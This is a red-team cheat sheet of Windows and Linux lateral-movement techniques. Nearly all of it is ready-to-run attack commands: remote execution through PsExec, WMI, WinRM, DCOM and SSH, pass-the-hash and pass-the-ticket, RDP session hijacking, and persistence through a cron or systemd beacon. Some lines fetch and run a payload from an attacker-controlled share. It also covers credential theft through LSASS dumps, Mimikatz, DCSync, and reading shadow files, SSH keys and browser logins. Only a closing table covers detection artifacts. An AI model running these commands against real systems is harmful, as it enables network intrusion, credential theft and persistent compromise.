# Lateral Movement — Offensive Techniques & Commands

> Sources: RTFM v3, MITRE ATT&CK TA0008, CrackMapExec wiki, Impacket documentation
> Purpose: Know how attackers move laterally to identify the artifacts they generate.

---

## Windows Lateral Movement Execution

### PsExec & Variants (T1569.002)

```bash
# Impacket psexec (from Linux attacker to Windows target)
psexec.py domain/user:password@10.10.10.5
psexec.py domain/user@10.10.10.5 -hashes :NTLM_HASH
psexec.py -k domain/user@target.domain.local  # Kerberos auth

# Impacket smbexec (no binary drop — uses service + batch file)
smbexec.py domain/user:password@10.10.10.5

# Impacket atexec (uses scheduled task)
atexec.py domain/user:password@10.10.10.5 "whoami"

# Impacket wmiexec (uses WMI — no service install)
wmiexec.py domain/user:password@10.10.10.5
wmiexec.py domain/user@10.10.10.5 -hashes :NTLM_HASH

# Impacket dcomexec (uses DCOM — multiple objects available)
dcomexec.py domain/user:password@10.10.10.5 -object MMC20
dcomexec.py domain/user:password@10.10.10.5 -object ShellWindows
```

```cmd
:: PsExec (Sysinternals)
psexec.exe \\10.10.10.5 -u domain\user -p password cmd.exe
psexec.exe \\10.10.10.5 -s cmd.exe  :: Run as SYSTEM
psexec.exe \\10.10.10.5 -c payload.exe  :: Copy and execute
psexec.exe \\10.10.10.5 -u domain\user -p password -d cmd.exe /c "powershell -ep bypass -f \\attacker\share\payload.ps1"
```

```powershell
# Native PowerShell alternative (copy + service creation)
Copy-Item .\payload.exe "\\10.10.10.5\C$\Windows\Temp\svc.exe"
sc.exe \\10.10.10.5 create backdoor binpath= "C:\Windows\Temp\svc.exe" start= demand
sc.exe \\10.10.10.5 start backdoor
sc.exe \\10.10.10.5 delete backdoor
```

### WMI (T1047)

```powershell
# Remote process creation via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt" -ComputerName 10.10.10.5 -Credential $cred

# Using wmic (cmd)
wmic /node:10.10.10.5 /user:domain\admin /password:pass process call create "cmd.exe /c powershell -ep bypass -f \\attacker\share\payload.ps1"

# CIM session (newer)
$session = New-CimSession -ComputerName 10.10.10.5 -Credential $cred
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}
```

### WinRM / PowerShell Remoting (T1021.006)

```powershell
# Interactive session
Enter-PSSession -ComputerName 10.10.10.5 -Credential $cred

# Execute command remotely
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -ScriptBlock { whoami; ipconfig }

# Execute on multiple hosts
Invoke-Command -ComputerName 10.10.10.5,10.10.10.6,10.10.10.7 -Credential $cred -ScriptBlock { hostname }

# Copy and execute
Copy-Item .\payload.ps1 -ToSession (New-PSSession -ComputerName 10.10.10.5 -Credential $cred) -Destination "C:\temp\payload.ps1"
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -ScriptBlock { powershell -ep bypass C:\temp\payload.ps1 }

# Evil-WinRM (from Linux)
evil-winrm -i 10.10.10.5 -u admin -p password
evil-winrm -i 10.10.10.5 -u admin -H NTLM_HASH
```

### RDP (T1021.001)

```bash
# From Linux
xfreerdp /v:10.10.10.5 /u:admin /p:password /cert:ignore
xfreerdp /v:10.10.10.5 /u:admin /pth:NTLM_HASH /cert:ignore  # Pass-the-hash RDP (restricted admin mode)

# RDP session hijacking (no password needed if SYSTEM)
# On target with multiple sessions:
query user
tscon <target_session_id> /dest:console  # Hijack from console
# From service/SYSTEM context:
sc create sesshijack binpath= "cmd.exe /k tscon <ID> /dest:rdp-tcp#0"
sc start sesshijack
```

```cmd
:: Enable RDP remotely (if disabled)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes

:: Enable restricted admin mode (for PTH over RDP)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

### SMB / Admin Shares (T1021.002)

```bash
# CrackMapExec — spray and execute
crackmapexec smb 10.10.10.0/24 -u admin -p password --exec-method smbexec -x "whoami"
crackmapexec smb 10.10.10.5 -u admin -H NTLM_HASH -x "whoami"
crackmapexec smb 10.10.10.5 -u admin -p password --sam  # Dump SAM
crackmapexec smb 10.10.10.5 -u admin -p password --lsa  # Dump LSA

# smbclient (file access)
smbclient //10.10.10.5/C$ -U 'domain/admin%password'
smbclient //10.10.10.5/ADMIN$ -U 'domain/admin%password'
```

```cmd
:: Map admin share
net use \\10.10.10.5\C$ /user:domain\admin password
:: Copy payload
copy payload.exe \\10.10.10.5\C$\Windows\Temp\
:: Execute via scheduled task
schtasks /create /s 10.10.10.5 /u domain\admin /p password /tn "update" /tr "C:\Windows\Temp\payload.exe" /sc once /st 00:00 /f
schtasks /run /s 10.10.10.5 /u domain\admin /p password /tn "update"
schtasks /delete /s 10.10.10.5 /u domain\admin /p password /tn "update" /f
```

### DCOM (T1021.003)

```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.5"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","Minimized")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.5"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c payload.exe","C:\Windows\System32",$null,0)

# ShellBrowserWindow
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.10.10.5"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\temp\out.txt","C:\Windows",$null,0)
```

### Pass-the-Hash (T1550.002)

```bash
# Impacket tools with hash
psexec.py -hashes :NTLM_HASH domain/admin@10.10.10.5
wmiexec.py -hashes :NTLM_HASH domain/admin@10.10.10.5
smbexec.py -hashes :NTLM_HASH domain/admin@10.10.10.5

# CrackMapExec with hash
crackmapexec smb 10.10.10.5 -u admin -H NTLM_HASH -x "whoami"
crackmapexec winrm 10.10.10.5 -u admin -H NTLM_HASH -x "whoami"

# Mimikatz PTH (creates new process with stolen token)
# sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:cmd.exe
```

```powershell
# Invoke-TheHash (PowerShell PTH)
Invoke-SMBExec -Target 10.10.10.5 -Username admin -Domain corp -Hash NTLM_HASH -Command "whoami" -Verbose
Invoke-WMIExec -Target 10.10.10.5 -Username admin -Domain corp -Hash NTLM_HASH -Command "whoami"
```

### Pass-the-Ticket (T1550.003)

```bash
# Export ticket from memory (Mimikatz)
# sekurlsa::tickets /export

# Import ticket
# kerberos::ptt ticket.kirbi

# Impacket with Kerberos ticket
export KRB5CCNAME=/tmp/krb5cc_admin
psexec.py -k -no-pass domain/admin@target.corp.local
wmiexec.py -k -no-pass domain/admin@target.corp.local

# Rubeus (Windows)
# Rubeus.exe ptt /ticket:base64ticket
# Rubeus.exe asktgt /user:admin /rc4:HASH /ptt
```

---

## Linux Lateral Movement Execution

### SSH (T1021.004)

```bash
# Password auth
ssh user@10.10.10.5
sshpass -p 'password' ssh user@10.10.10.5

# Key auth (with stolen key)
ssh -i stolen_key user@10.10.10.5

# Execute command without interactive shell
ssh user@10.10.10.5 'cat /etc/shadow'

# SSH with agent forwarding (pivot through multiple hosts)
ssh -A user@pivot
# Then from pivot: ssh user@internal

# ProxyJump (multi-hop)
ssh -J user@pivot user@internal-host

# SCP file transfer
scp payload user@10.10.10.5:/tmp/
scp -i stolen_key payload user@10.10.10.5:/tmp/
```

### Ansible / Remote Execution

```bash
# Ansible ad-hoc command on multiple hosts
ansible all -i "10.10.10.5,10.10.10.6," -m shell -a "whoami" -u root --private-key stolen_key

# Ansible playbook for mass execution
ansible-playbook -i hosts.txt payload.yml
```

### Remote Commands via Services

```bash
# Execute via SSH and at/cron (persistence + lateral)
ssh user@10.10.10.5 'echo "*/5 * * * * /tmp/beacon" | crontab -'

# Remote systemd service creation
ssh root@10.10.10.5 'cat > /etc/systemd/system/health.service << EOF
[Unit]
Description=Health
[Service]
ExecStart=/tmp/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable --now health.service'
```

### Internal Pivoting

```bash
# After compromising first host, scan internal network
# Upload nmap/masscan/static binary
./nmap -sT -Pn 10.10.10.0/24 -p 22,80,443,445,3389 --open

# Use compromised host as jump point
ssh -D 1080 -N user@pivot &
proxychains ssh user@10.10.10.5

# Forward credentials/sessions
# If sudo/root: read other users' SSH keys
find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat /home/*/.ssh/id_*

# Steal Kerberos tickets (Linux domain-joined)
find /tmp -name "krb5cc_*" 2>/dev/null
export KRB5CCNAME=/tmp/krb5cc_<uid>
```

---

## Credential Harvesting for Lateral Movement

### Windows

```powershell
# Mimikatz — dump credentials from memory
# privilege::debug
# sekurlsa::logonpasswords    ← plaintext passwords, NTLM hashes
# sekurlsa::wdigest           ← WDigest passwords
# lsadump::sam                ← local SAM hashes
# lsadump::dcsync /user:krbtgt  ← DCSync (domain admin level)

# LaZagne (credential recovery)
.\lazagne.exe all

# Dump SAM via registry (requires admin)
reg save HKLM\SAM C:\temp\sam.hiv
reg save HKLM\SYSTEM C:\temp\system.hiv
# Offline: secretsdump.py -sam sam.hiv -system system.hiv LOCAL

# LSASS dump
# Task Manager → lsass.exe → Create dump file
# Or: procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
# Or: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full

# Credential Guard bypass (if enabled)
# PPLKiller, PPLDump, or kernel driver exploits

# DCSync (Mimikatz / Impacket)
secretsdump.py domain/admin:password@DC-IP
secretsdump.py -hashes :NTLM_HASH domain/admin@DC-IP
```

### Linux

```bash
# Read shadow file (if root)
cat /etc/shadow

# Search for credentials in files
grep -rl "password\|passwd\|secret\|token" /etc /opt /home 2>/dev/null
find / -name "*.conf" -o -name "*.cfg" -o -name ".env" -o -name "wp-config.php" 2>/dev/null | xargs grep -l "pass\|secret\|token" 2>/dev/null

# Steal SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
cat /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null

# Memory credential extraction
strings /proc/*/maps 2>/dev/null | grep -i password
# mimipenguin (Linux credential harvester)
# LaZagne Linux: python3 laZagne.py all

# Keyring/Wallet
find / -name "*.keyring" -o -name "*.wallet" -o -name "login.keyring" 2>/dev/null

# Browser credentials
find / -name "Login Data" -o -name "logins.json" -o -name "key4.db" 2>/dev/null
```

---

## Detection Signatures

| Technique | Key Detection Artifacts |
|-----------|----------------------|
| PsExec | PSEXESVC service install (Event 7045), admin share access, named pipe `\PSEXESVC` |
| WMI exec | WMI-Activity log, WmiPrvSE.exe spawning processes, Event 4688 with WMI parent |
| WinRM | WinRM Operational log (Event 6/91), PowerShell remoting events (53504) |
| DCOM | Event 10016, DCOMLaunch events, unusual COM object instantiation |
| Pass-the-Hash | LogonType 3/9 with NTLM, Event 4624 from unusual source, Mimikatz artifacts |
| SSH lateral | auth.log accepted connections, agent forwarding, multiple sessions from single source |
| CrackMapExec | Multiple SMB auth attempts across subnet, rapid sequential logons |
| Credential dump | LSASS access (Sysmon Event 10), SAM/SYSTEM registry saves, procdump execution |
| DCSync | Directory replication events (Event 4662), unusual replication source |
